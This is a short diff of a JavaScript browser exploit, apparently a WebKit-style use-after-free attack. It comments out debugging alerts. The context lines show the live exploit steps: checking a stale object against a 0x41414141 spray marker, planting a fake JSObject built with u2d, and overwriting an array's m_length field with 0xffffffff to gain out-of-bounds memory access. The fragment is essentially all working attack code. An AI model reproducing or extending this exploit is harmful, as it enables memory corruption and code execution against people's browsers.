@@ -147,7 +147,7 @@ function go_() {
 	var stale = target.stale;
 
 	if((before_len != stale.length) && (stale[0] == 0x41414141)){
-		alert("Exploit Worked");
+		//alert("Exploit Worked");
 		keep(arr);
 	} else {
 		document.location.reload();
@@ -163,7 +163,7 @@ function go_() {
 			// Check if this is what the stale object points to (0x4141414 + 0x101 == 0x41414242)
 			// If this is true then stale[0] points to the same thing as bufs[i][k]
 			if(bufs[i][k] == 0x41414242) {
-				alert("Found the object!!");
+				//alert("Found the object!!");
 
 				stale[0] = {
 					'a': u2d(105, 0x1172600), // the JSObject properties
@@ -197,15 +197,15 @@ function go_() {
 				//var x = stale[0];
 				//alert("Accesing stale[0]");
 				
-				alert("Orginal smsh len:" + smsh.length);
+				//alert("Orginal smsh len:" + smsh.length);
 				stale[0][6] = 0xffffffff; // Overide m_length field
-				alert("New smsh len:" + smsh.length);
+				//alert("New smsh len:" + smsh.length);
 				
 				// Adding new code here
 				//bck = stale[0][4];
 				
 				alert("3");
-				alert("4");
+				//alert("4");
 				
 				// Uncommenting this block comment breaks everything.
 				/*
